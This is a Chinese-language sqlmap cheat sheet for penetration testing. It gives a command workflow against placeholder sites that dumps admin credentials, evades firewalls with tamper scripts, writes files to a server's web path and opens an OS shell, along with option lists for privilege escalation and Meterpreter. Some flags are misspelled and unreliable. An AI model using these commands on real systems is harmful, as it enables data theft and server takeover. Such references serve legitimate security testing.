sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库
<a name="onFrw"></a>
## 模式和常用参数
<a name="B2NZi"></a>
### sqlmap支持五种不同的注入模式
基于布尔的盲注：可以根据返回页面判断条件真假的注入；<br />基于时间的盲注：用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；<br />基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；<br />联合查询的注入：可以使用union的情况下的注入；<br />堆叠查询的注入：可以同时执行多条语句的执行时的注入。
<a name="sjTI1"></a>
### 常用sqlmap参数
```bash
-D 数据库名    -T 数据库表名     -C 数据库列名     -U 数据库用户名
-D 数据库名 --tables    #获取D数据库中所有的表名
-D 数据库名 -T 表名 --columns    #获取D数据库中T表里所有的列名
-T 表名 -C username，password --dump   #下载T表里username，password列的数据内容

-u   #-u=--url=URL ，指定url地址,get请求可以在url加上相关参数
-r   #指定加载文件 ，适用于所有的请求和https。流程是抓包、保存到文件、从文件加载HTTP请求；方便跳过设置一些其他参数（cookie，POST等）
-p   #指定用url或文件中的哪个参数做注入参数
-m   #读取文件中的url列表以批量测试
--date    #post方式传入参数 --date "id=1&co=5"
--dbs     #显示所有的数据库
--current-user #获取当前数据库用户
--current-db   #获取网站当前数据库
--is-dba  #判断当前的用户是否为管理员
--users   #获取所有数据库用户
--level   #测试的等级（1-5，默1）,数值>=2的时候也会检查cookie里面的参数，当>=3的时候将检查User-agent和Referer。
--risk    #测试的风险（0-3，默1）,1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
--threads #同时执行测试的线程数
--mobile  #模拟测试手机环境站点
--batch -smart  #不需要人确定，自动填写yes
--batch -smart  #全自动化判断测试，不需要人确定
--os-shell   #获取系统交互的shell
--tamper "  "    #sqlmap绕过waf，需要加载绕过方式脚本，可多个
--passwords  #尝试解码出hash密码原文
-v   #输出信息级别: 0-6 ，
     “0”只显示python错误以及严重的信息；
     1同时显示基本信息和警告信息（默认）；
     “2”同时显示debug信息；
     “3”同时显示注入的payload；
     “4”同时显示HTTP请求；
     “5”同时显示HTTP响应头；
     “6”同时显示HTTP响应页面；
     如果想看到sqlmap发送的测试payload最好的等级就是3。

--file-read  #读取服务器上指定文件内容 --file-read "C:/example.exe"
--file-write #上传本地文件 --file-write "c:/1.txt" --file-dest "C:/php/sql.php"
--file-dest  #上传到服务器指定目录
```
<a name="bVqav"></a>
## 一般的SQLMap操作流程
```bash
# 1.通过手工检测的方式，找到合适的注入点
payload：'         #返回错误
payload：and 1=1   #返回正常
payload：and 1=2   #返回错误
##满足以上条件即存在注入

# 2.检查注入点：
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --level3

# 3.爆所有数据库信息：
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --dbs 

# 4.爆当前数据库信息，爆当前用户权限。
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch --current-db --is-dba

# 5.指定库名列出所有表：
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news --tables 

# 6.指定库名表名列出所有字段：
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news -T admin --column 

# 7.指定库名表名字段dump出指定字段：
sqlmap -u "http://xx.com/" --data "word=1&number=5" --batch -D news -T admin -C name,pswd --dump 

# 8.加载脚本绕过防火墙
sqlmap -u "http://xx.com/" --data "word=1&number=5" --tamper randomcase.py

# 9.爆当前的用户名称
sqlmap -u "http://xx.com/" --data "word=1&number=5" --current-user

# 10.爆当前用户密码
sqlmap -u "http://xx.com/" --data "word=1&number=5" --passwods

# 11.连接系统交互shell
sqlmap -u "http://xx.com/" --data "word=1&number=5" --os-shell
```
<a name="u6ELM"></a>
## 常用语句
```bash
# 基础检测语法
sqlmap.py -u http://127.0.0.1/user_info.php?uid=1024

# 批量检测
sqlmap.py -m target.txt
## 注意target.txt跟sqlmap在同一个目录下。

# 获取表中的数据个数
sqlmap.py -u "http://www.potian.com/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb

# 站点爬取
sqlmap.py -u "http://www.secbang.com" --batch --crawl=3

# 使用hex避免字符编码导致数据丢失
sqlmap.py -u "http://www.secbang.com/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors

# 模拟测试手机环境站点
python sqlmap.py -u "http://www.secbang.com/vuln.php?id=1" --mobile

# 智能判断测试
sqlmap.py -u "http://www.secbang.com/info.php?id=1" --batch --smart

# 结合burpsuite进行注入
sqlmap.py -r burpsuite 抓包.txt

# sqlmap 自动填写表单注入
sqlmap.py -u URL --forms

# 执行shell命令
sqlmap.py -u "url" --os-cmd="ls" #执行net user命令
sqlmap.py -u "url" --os-shell    #系统交互的shell

# 延时注入
sqlmap --dbs -u "url" --delay 0.5 #延时0.5秒*/ 
sqlmap --dbs -u "url" --safe-freq #请求2次*/
```
<a name="Qn60F"></a>
## 其他
<a name="LdWt3"></a>
### 实用技巧
这些选项可用于调整具体的SQL注入测试
```bash
--technique=TECH    SQL注入技术测试（默认BEUST）    
--time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）   
--union-cols=UCOLS  定列范围用于测试UNION查询注入   
--union-char=UCHAR  暴力猜测列的字符数   
--union-from=UFROM  SQL注入UNION查询使用的格式  
--dns-domain=DNS..  DNS泄露攻击使用的域名   
--second-order=S..  URL搜索产生的结果页面
```
<a name="TekFe"></a>
### 枚举信息
这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外还可以运行自定义的SQL语句。
```bash
-a, –all           获取所有信息   
-b, –banner        获取数据库管理系统的标识  
--current-user      获取数据库管理系统当前用户   
--current-db        获取数据库管理系统当前数据库   
--hostname         获取数据库服务器的主机名称  
--is-dba            检测DBMS当前用户是否DBA  
--users             枚举数据库管理系统用户  
--passwords         枚举数据库管理系统用户密码哈希   
--privileges        枚举数据库管理系统用户的权限   
--roles            枚举数据库管理系统用户的角色   
--dbs             枚举数据库管理系统数据库  
--tables            枚举的DBMS数据库中的表   
--columns          枚举DBMS数据库表列   
--schema            枚举数据库架构  
--count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb  
--dump            转储数据库表项  
--dump-all          转储数据库所有表项  
--search           搜索列（S），表（S）和/或数据库名称（S）  
--comments          获取DBMS注释  
-D DB               要进行枚举的指定数据库名  
-T TBL              DBMS数据库表枚举  
-C COL             DBMS数据库表列枚举  
-X EXCLUDECOL     DBMS数据库表不进行枚举  
-U USER           用来进行枚举的数据库用户  
--exclude-sysdbs    枚举表时排除系统数据库   
--start=LIMITSTART  获取第一个查询输出数据位置  
--stop=LIMITSTOP   获取最后查询的输出数据  
--first=FIRSTCHAR   第一个查询输出字的字符获取  
--last=LASTCHAR    最后查询的输出字字符获取  
--sql-query=QUERY   要执行的SQL语句  
--sql-shell         提示交互式SQL的shell  
--sql-file=SQLFILE  要执行的SQL文件
```
<a name="EMRbo"></a>
### 操作系统访问
这些选项可以用于访问后端数据库管理系统的底层操作系统
```bash
--os-cmd=OSCMD   执行操作系统命令（OSCMD）   
--os-shell       交互式的操作系统的shell   
--os-pwn          获取一个OOB shell，meterpreter或VNC   
--os-smbrelay       一键获取一个OOBshell，meterpreter或VNC  
--os-bof           存储过程缓冲区溢出利用  
--priv-esc          数据库进程用户权限提升  
--msf-path=MSFPATH  MetasploitFramework本地的安装路径  
--tmp-path=TMPPATH  远程临时文件目录的绝对路径
```
<a name="oQCMY"></a>
### Windows注册表访问
这些选项可以被用来访问后端数据库管理系统Windows注册表
```bash
--reg-read          读一个Windows注册表项值  
--reg-add           写一个Windows注册表项值数据  
--reg-del           删除Windows注册表键值  
--reg-key=REGKEY    Windows注册表键  
--reg-value=REGVAL  Windows注册表项值  
--reg-data=REGDATA  Windows注册表键值数据  
--reg-type=REGTYPE  Windows注册表项值类型
```
<a name="ueMMy"></a>
### 优化功能
这些选项可用于优化sqlmap性能
```bash
-o               打开所有的优化开关    
--predict-output    预测普通查询输出    
--keep-alive        使用持久HTTP（S）连接    
--null-connection   获取页面长度    
--threads=THREADS   当前http(s)最大请求数 (默认 1)
```
<a name="FT3fq"></a>
### 指定注入
这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。
```bash
-p TESTPARAMETER    可测试的参数    
--skip=SKIP         跳过对给定参数的测试    
--skip-static       跳过测试不显示为动态的参数    
--param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）   
--dbms=DBMS         强制后端的DBMS为此值    
--dbms-cred=DBMS..  DBMS认证凭证(user:password)    
--os=OS            强制后端的DBMS操作系统为这个值    
--invalid-bignum    使用大数字使值无效    
--invalid-logical   使用逻辑操作使值无效   
--invalid-string    使用随机字符串使值无效    
--no-cast          关闭有效载荷铸造机制    
--no-escape         关闭字符串逃逸机制    
--prefix=PREFIX     注入payload字符串前缀  
--suffix=SUFFIX     注入payload字符串后缀    
--tamper=TAMPER   使用给定的脚本篡改注入数据
```
<a name="RZL9q"></a>
## Tamper功能
```
序号    脚本名称    注释  
1    0x2char    将每个编码后的字符转换为等价表达  
2    apostrophemask    单引号替换为Utf8字符  
3    apostrophenullencode    替换双引号为%00%27  
4    appendnullbyte    有效代码后添加%00  
5    base64encode    使用base64编码  
6    between    比较符替换为between  
7    bluecoat    空格替换为随机空白字符，等号替换为like  
8    chardoubleencode    双url编码  
9    charencode    将url编码  
10    charunicodeencode    使用unicode编码  
11    charunicodeescape    以指定的payload反向编码未编码的字符 
12    commalesslimit    改变limit语句的写法  
13    commalessmid    改变mid语句的写法  
14    commentbeforeparentheses    在括号前加内联注释  
15    concat2concatws    替换CONCAT为CONCAT_WS  
16    equaltolike    等号替换为like  
17    escapequotes    双引号替换为\\\\  
18    greatest    大于号替换为greatest  
19    halfversionedmorekeywords    在每个关键字前加注释  
20    htmlencode    html编码所有非字母和数字的字符  
21    ifnull2casewhenisnull    改变ifnull语句的写法  
22    ifnull2ifisnull    替换ifnull为if(isnull(A))  
23    informationschemacomment    标示符后添加注释  
24    least    替换大于号为least  
25    lowercase    全部替换为小写值  
26    modsecurityversioned    空格替换为查询版本的注释  
27    modsecurityzeroversioned    添加完整的查询版本的注释  
28    multiplespaces    添加多个空格  
29    nonrecursivereplacement    替换预定义的关键字  
30    overlongutf8    将所有字符转义为utf8  
31    overlongutf8more    以指定的payload转换所有字符  
32    percentage    每个字符前添加%  
33    plus2concat    将加号替换为concat函数  
34    plus2fnconcat    将加号替换为ODBC函数{fn CONCAT()}  
35    randomcase    字符大小写随机替换  
36    randomcomments    /**/分割关键字  
37    securesphere    添加某字符串  
38    sp_password    追加sp_password字符串  
39    space2comment    空格替换为/**/  
40    space2dash    空格替换为–加随机字符  
41    space2hash    空格替换为#加随机字符  
42    space2morecomment    空格替换为/**_**/  
43    space2morehash    空格替换为#加随机字符及换行符  
44    space2mssqlblank    空格替换为其他空符号  
45    space2mssqlhash    空格替换为%23%0A  
46    space2mysqlblank    空格替换为其他空白符号  
47    space2mysqldash    空格替换为–%0A  
48    space2plus    空格替换为加号  
49    space2randomblank    空格替换为备选字符集中的随机字符  
50    symboliclogical    AND和OR替换为&&和||  
51    unionalltounion    union all select替换为union select 
52    unmagicquotes    宽字符绕过GPC  
53    uppercase    全部替换为大写值  
54    varnish    添加HTTP头  
55    versionedkeywords    用注释封装每个非函数的关键字  
56    versionedmorekeywords    使用注释绕过
57    xforwardedfor    添加伪造的HTTP头
```
